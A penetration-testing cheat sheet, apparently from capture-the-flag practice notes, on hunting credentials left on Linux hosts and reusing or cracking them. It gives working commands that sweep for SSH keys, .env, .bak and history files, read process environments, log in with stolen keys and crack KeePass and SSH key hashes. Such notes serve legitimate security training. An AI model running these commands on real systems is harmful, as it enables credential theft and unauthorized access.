Creds, keys, and hashes left on disk → reuse or crack. The most common user→root and box→box pivot.
## Goal
Find plaintext passwords, SSH keys, DB creds, hashes, and .bak files; reuse or crack them.
## Tips
After ANY find, try the credential everywhere (su/sudo/ssh/db). A service's `.bak`/`.old` file often holds the password the live config hides.

> For an unfamiliar credential-bearing file (archive, DB, key, doc, mail, browser store) use the general [[artifact_triage]] flow — identify by magic, classify the secret (decode vs decrypt vs crack), convert with the right `*2john`, then verify. Don't crack what's merely encoded.

Checklist:
- [ ] SSH keys in any home / root? (id_rsa)
- [ ] config / .env / .bak with creds?
- [ ] history files (.bash_history, .mysql_history)?
- [ ] .my.cnf / db creds? KeePass .kdbx?
# Commands

### Step 1: Enumerate / Hunt for files 
```bash
cat ~/.bash_history /home/*/.bash_history 2>/dev/null
find / \( -name id_rsa -o -name authorized_keys \) 2>/dev/null
cat ~/.my.cnf /root/.my.cnf 2>/dev/null
find / \( -name '*.bak' -o -name '*.config' -o -name '.env' \) 2>/dev/null
```

### Step 2: sweep + linpeas
```bash
grep -rinE 'pass(word|wd)?|secret|api[_-]?key' /etc /var/www /opt /home 2>/dev/null | grep -vi binary
find / -name '*.kdbx' 2>/dev/null
# linpeas: "Searching passwords" / "Analyzing SSH Files" / "Backup files"
```

### Step 2b: process command lines & environment (creds live here too)
```bash
ps auxww | grep -iE 'pass|pwd|token|-p ' 2>/dev/null   # creds passed on the command line
cat /proc/<pid>/environ | tr '\0' '\n'                  # a process's env (DB_PASS, API tokens) — perms permitting
cat /etc/environment ; env                               # machine-wide + your env
```
Map any interesting service: **listener → PID → binary → owner → config/version** ([[00 master checklist]] orientation · [[internal_port_enum]]).

## Exploit
### Case 1: SSH private key
**Enumerate:**
```bash
find / -name id_rsa 2>/dev/null
# a private key (no .pub) -> ssh in
```
**Exploit:**
```bash
chmod 600 id_rsa
ssh -i id_rsa <user>@<target>
# seen on: THM Brute-It, HTB Keeper
```

### Case 2: Creds in config / .bak / .env
**Enumerate:**
```bash
cat /var/www/html/config.php /opt/*/.env *.bak 2>/dev/null
# DB / app password in plaintext
```
**Exploit:**
```bash
su <user>          # reuse it
sudo -l            # re-check
```

### Case 3: History files
**Enumerate:**
```bash
cat /home/*/.bash_history /root/.bash_history 2>/dev/null
# a password typed on a command line (mysql -p<pass>, etc.)
```
**Exploit:**
```bash
su <user>          # reuse the leaked password
```

### Case 4: KeePass .kdbx
**Enumerate:**
```bash
find / -name '*.kdbx' 2>/dev/null
```
**Exploit:**
```bash
keepass2john Database.kdbx > kp.hash        # (on kali, after exfil)
hashcat -m 13400 kp.hash rockyou.txt
# seen on: HTB Keeper (KeePass -> PuTTY key -> root SSH)
```

## Helpline:
1. Where creds hide
```
~/.bash_history  ~/.ssh/  ~/.my.cnf  /var/www/*/config*  .env  *.bak
service config files, env vars (env), linpeas "passwords" section.
```

2. Reuse principle
```
one cred = try on EVERY user + sudo + ssh + db. reuse beats exploits.
```

3. SSH key perms
```
chmod 600 id_rsa      # ssh refuses world-readable keys
ssh -i id_rsa user@target
# encrypted key? ssh2john id_rsa > h ; john h
```

4. .bak files
```
a service's *.bak / *.old / *~ often has the password the live config hides.
always grep backups.
```

5. KeePass
```
*.kdbx -> keepass2john -> hashcat -m 13400.
inside: passwords, often SSH/PuTTY keys (-> .ppk via puttygen).
```
